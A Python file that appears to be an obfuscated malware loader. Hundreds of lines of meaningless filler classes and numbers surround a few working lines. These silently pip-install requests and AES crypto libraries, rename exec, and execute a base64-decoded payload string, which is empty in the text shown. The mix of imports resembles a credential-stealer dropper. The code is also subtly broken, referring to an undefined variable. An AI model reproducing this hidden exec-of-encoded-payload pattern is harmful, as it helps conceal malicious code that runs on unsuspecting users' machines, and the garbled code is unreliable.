

from sys import executable, stderr
VoJ6YGBClv = 87370631
k31r6kotWQ = 26773669
class c2H1fyTsSb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
AQL8vFiraI = 12835394
class Wggcq6TCpY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class wpqJIF4MMD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
NsPhlK9c7o = 20563238
v2Stg0vwKq = 80577654
class y2GAF2byDe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'iILt1ZOkXL'
class oyLARjEWoL:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GMR4JxMAL1 = 8378652
class yKjonLwBBF:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'JpM4coMFeN'", "'SZ6u8V2Iwg'", "'cF1ScNpTV2'", "'fO0s9GfcfA'", "'sikImyUdkC'"]
{'username': 'BfRXtsF', 'age': 78}
class rAMh4psGM4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pKae29ELRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kI28cOA2kp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
M9z3uSnOqi = 19739384
Lzs4wuaLL1 = 85555754
Upw10Kgwt4 = 81542694
Zo1BazE7oG = 22335297
class IK3sd36THe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
VoJ6YGBClv = 87370631
k31r6kotWQ = 26773669
class c2H1fyTsSb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
AQL8vFiraI = 12835394
class Wggcq6TCpY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class wpqJIF4MMD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
NsPhlK9c7o = 20563238
v2Stg0vwKq = 80577654
class y2GAF2byDe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'iILt1ZOkXL'
class oyLARjEWoL:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GMR4JxMAL1 = 8378652
class yKjonLwBBF:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'JpM4coMFeN'", "'SZ6u8V2Iwg'", "'cF1ScNpTV2'", "'fO0s9GfcfA'", "'sikImyUdkC'"]
{'username': 'BfRXtsF', 'age': 78}
class rAMh4psGM4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pKae29ELRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kI28cOA2kp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
M9z3uSnOqi = 19739384
Lzs4wuaLL1 = 85555754
Upw10Kgwt4 = 81542694
Zo1BazE7oG = 22335297
class IK3sd36THe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
DBMskXi0JNxQghvsFDFnQCeMMgFqn8sIkrgEVU = exec
VoJ6YGBClv = 87370631
k31r6kotWQ = 26773669
class c2H1fyTsSb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
AQL8vFiraI = 12835394
class Wggcq6TCpY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class wpqJIF4MMD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
NsPhlK9c7o = 20563238
v2Stg0vwKq = 80577654
class y2GAF2byDe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'iILt1ZOkXL'
class oyLARjEWoL:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GMR4JxMAL1 = 8378652
class yKjonLwBBF:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'JpM4coMFeN'", "'SZ6u8V2Iwg'", "'cF1ScNpTV2'", "'fO0s9GfcfA'", "'sikImyUdkC'"]
{'username': 'BfRXtsF', 'age': 78}
class rAMh4psGM4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pKae29ELRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kI28cOA2kp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
M9z3uSnOqi = 19739384
Lzs4wuaLL1 = 85555754
Upw10Kgwt4 = 81542694
Zo1BazE7oG = 22335297
class IK3sd36THe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
import concurrent.futures
ZcuOLyNqhYWeDfMVJNhIDxXyTLw1bQd1IurkP8=""
DBMskXi0JNxQghvsFDFnQCeMMgFqn8sIkrgEVU(base64.b64decode(ZcuOLyNqhYWeDfMVJNhIDxXyTLw1bQd1IurkP8))
VoJ6YGBClv = 87370631
k31r6kotWQ = 26773669
class c2H1fyTsSb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
AQL8vFiraI = 12835394
class Wggcq6TCpY:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class wpqJIF4MMD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
NsPhlK9c7o = 20563238
v2Stg0vwKq = 80577654
class y2GAF2byDe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'iILt1ZOkXL'
class oyLARjEWoL:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
GMR4JxMAL1 = 8378652
class yKjonLwBBF:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
["'JpM4coMFeN'", "'SZ6u8V2Iwg'", "'cF1ScNpTV2'", "'fO0s9GfcfA'", "'sikImyUdkC'"]
{'username': 'BfRXtsF', 'age': 78}
class rAMh4psGM4:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class pKae29ELRb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class kI28cOA2kp:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
M9z3uSnOqi = 19739384
Lzs4wuaLL1 = 85555754
Upw10Kgwt4 = 81542694
Zo1BazE7oG = 22335297
class IK3sd36THe:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data